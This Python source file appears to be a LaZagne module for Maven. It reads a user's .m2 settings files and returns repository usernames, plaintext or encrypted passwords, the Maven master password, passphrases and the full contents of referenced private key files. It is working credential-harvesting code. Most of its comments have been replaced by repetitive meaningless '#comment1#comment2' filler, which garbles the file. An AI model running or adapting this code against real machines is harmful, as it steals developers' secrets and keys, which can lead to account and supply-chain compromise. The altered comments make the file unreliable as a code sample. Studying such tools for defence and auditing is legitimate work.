# -*- coding: utf-8 -*-
import os
from xml.etree import ElementTree

from lazagne.config.constant import constant
from lazagne.config.module_info import ModuleInfo


class MavenRepositories(ModuleInfo):

    def __init__(self):
        ModuleInfo.__init__(self, 'mavenrepositories', 'maven')
        # Interesting XML nodes in Maven repository configuration
        self.nodes_to_extract = ["id", "username", "password", "privateKey", "passphrase"]
        self.settings_namespace = "{http://maven.apache.org/SETTINGS/1.0.0}"

    def extract_master_password(self):
        #comment 1
        master_password = None
        master_password_file_location = constant.profile["USERPROFILE"] + u'\\.m2\\settings-security.xml'
        if os.path.isfile(master_password_file_location):
            try:
                config = ElementTree.parse(master_password_file_location).getroot()
                master_password_node = config.find(".//master")
                if master_password_node is not None:
                    master_password = master_password_node.text
            except Exception as e:
                self.error(u"Cannot retrieve master password '%s'" % e)
                master_password = None

        return master_password

    def extract_repositories_credentials(self):
        #comment1#comment2#comment3#comment4#comment1#comment2#comment3
        repos_creds = []
        maven_settings_file_location = constant.profile["USERPROFILE"] + u'\\.m2\\settings.xml'
        if os.path.isfile(maven_settings_file_location):
            try:
                settings = ElementTree.parse(maven_settings_file_location).getroot()
                server_nodes = settings.findall(".//%sserver" % self.settings_namespace)
                for server_node in server_nodes:
                    creds = {}
                    for child_node in server_node:
                        tag_name = child_node.tag.replace(self.settings_namespace, "")
                        if tag_name in self.nodes_to_extract:
                            creds[tag_name] = child_node.text.strip()
                    if len(creds) > 0:
                        repos_creds.append(creds)
            except Exception as e:
                self.error(u"Cannot retrieve repositories credentials '%s'" % e)

        return repos_creds

    def use_key_auth(self, creds_dict):
        #comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
        state = False
        if "privateKey" in creds_dict:
            pk_file_location = creds_dict["privateKey"]
            pk_file_location = pk_file_location.replace("${user.home}", constant.profile["USERPROFILE"])
            state = os.path.isfile(pk_file_location)

        return state

    def run(self):
        #comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2

        #comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1
        master_password = self.extract_master_password()

        #comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
        repos_creds = self.extract_repositories_credentials()

        #comment1#comment2#comment3#comment4#comment1#comment2#comment3
        #comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
        #comment1#comment2#comment3#comment4#comment1#comment2#comment3
        #comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
        pwd_found = []
        for creds in repos_creds:
            values = {
                "Id": creds["id"],
                "Login": creds["username"]
            }
            if not self.use_key_auth(creds):
                pwd = creds["password"].strip()
                # Case for authentication using password protected with the master password
                if pwd.startswith("{") and pwd.endswith("}"):
                    values["SymetricEncryptionKey"] = master_password
                    values["PasswordEncrypted"] = pwd
                else:
                    values["Password"] = pwd
            else:
                # Case for authentication using private key
                pk_file_location = creds["privateKey"]
                pk_file_location = pk_file_location.replace("${user.home}", constant.profile["USERPROFILE"])
                with open(pk_file_location, "r") as pk_file:
                    values["PrivateKey"] = pk_file.read()
                if "passphrase" in creds:
                    values["Passphrase"] = creds["passphrase"]
            pwd_found.append(values)

        return pwd_found
